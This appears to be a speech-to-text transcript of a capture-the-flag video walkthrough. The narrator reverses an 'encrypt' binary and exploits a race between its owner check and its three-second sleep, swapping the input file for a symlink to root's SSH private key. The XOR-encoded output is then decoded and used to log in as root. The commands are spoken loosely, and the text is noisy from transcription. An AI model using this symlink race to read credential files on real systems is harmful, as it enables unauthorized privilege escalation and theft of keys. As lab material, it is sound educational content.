should um reverse this so backslash x five eight backslash five b five eight five five five six we can try it this way xuv i could have just done that manually i guess um print xuv like this and we can try doing it this way to see what happens if it doesn't we'll probably have to step through this and a debugger to see what's happening um negative 202 976 456. there we go so that was it we just had to change the endianness of it and now it wants an input file so let's look at exactly what this does so it's declaring a lot of things up here and then we do input file so local 84. i'm going to call this infile and then encrypted file i'm guessing this is out so i'll call that out file okay so it's running stat against this this ivr1 is going to be result and it runs stat and make sure well um this is the output of stat i believe this local 70. it's checking if the uid is zero if the uid is zero it's going to say the file is owned by root and then exit else it's going to sleep for three seconds and then open the file and probably encrypt it right see does f open while true where is the encryption routine see f open else while true local 18 oh right here so its encryption is just xoring it with the byte 8 uh 9b so this is the um i'm going to call it i guess n byte or maybe we can call it just i so it xor is that and then writes it to this i believe i don't know what that is maybe i should just rename out file to encrypt file because that's what they called it but i think this is where it's writing to um or maybe it's putting it as a pointer to then right i don't know but that looks like exactly what is happening so we have a timing issue like it's going to check it and then it's going to sleep for three seconds so while it sleeps we can make that file now become a sim link somewhere so then it opens a file we want so um i'm guessing like the um what is it uh shoot um ssh key is what we want so i'm going to ssh let's go here sh-i tester at 10 10 11 119 we need to specify the key there we go so i'm going to cd temp and we're going to echo hello to temp all right we'll do this please subscribe so if we lsla it's set uid is not root so we should be able to use this as the input file so please subscribe and then temp we'll call it encrypted out and while we do that i'm going to make sure i get my symbolic link right so root.ssh id rsa to test i just want to look at test and test is now pointed there so i did the symbolic link correctly so we can just remove that and we'll just replace this with please subscribe and then i'm going to rm the actual file so we're going to hit enter here go down this pane hit enter here to replace the file with the one we expect so do this do that and we should get an encrypted out file it does a seg fault here um i'm going to guess it crashed because like we clobbered like the base address so it didn't know where to return to after this function because if i cut this vial uh we don't have it shoot lsla uh we don't have anything well that was unfortunate i'm going to try it again real quick so we do this we enter the pin then the name we do this so we get into the encrypt function input file temp please subscribe encrypted file i wonder if this file has to exist touch that file and then let's remove whoops rm please subscribe echo hello to please subscribe and we want to copy this okay so we'll do temp encrypted out so let's try this again now we created that file maybe it doesn't do that we've repointed it it's still crashed if we look at encrypted out size of zero so we are missing something we do this and we're not getting to this exit so i think we're good there it's going to open in file which is what we want and it's also going to open out file with wb apologies for the sloppy cut there was something really weird going on with this exploit just wasn't working in slash temp i cut out probably about like 15 to 20 minutes of just random troubleshooting that just ended nowhere so i'm going to make the directory ipsec and we're just going to work out of here so i'm going to vi i'm going to call this just exploit because i don't want to type the pin code every single time so we can just do it this way so put each thing we enter on a new line so this will be temp ipsec input and this is temp ipsec output if we just write this then we call the file encrypt and put tap ipsec exploit it's going to send each of those lines here and it'll just automate it so we have to type everything so we want to create the directory input so echo a to input and then we can just do rm input ln sf root dot ssh id rsa to input we don't do the directing we just do space input so now when we run this we'll have three seconds to go down here and hit enter so run enter and we should have an output file now here if we look at it less output it looks like binary it is a bunch of xor data so before people think i'm crazy let's just v exploit again temp ipsec exploit and i'm going to get rid of this ipsec directory we'll just do input and output right so here we can echo a to input rm input ln dash sf root uh dot ssh wait what file did i just put did i put the idrsa yep i did root ssh id rsa to input so that is exactly what i did actually to make sure we don't have any typos whatsoever i can literally copy and paste this right so copy this paste and we'll have three seconds after we run this command and again if i cat temp ipsec exploit that's what it looks like so do this do this and it's going to sag fault and we won't have an output and i have no idea why we don't have output when we're just in slash temp but it works when we're in ipsec don't know why um but that is the case so if i just base64 output uh let's do base64-w0 output we can copy it and we can go to cyber chef so gchq cyber chef because it was just a straight xor i believe so from base 64. we have a bunch of stuff here let's go back to the code it is xoring with 0x9b so xor key 9b and boom we have an ssh key so we can copy it v root paste chmod 600 root s h i root root at 10 10 11 119 i believe and there we go we are root at overflow so um not exactly sure what was going on there but that is the box hope you guys enjoy it take care and i will see you all next time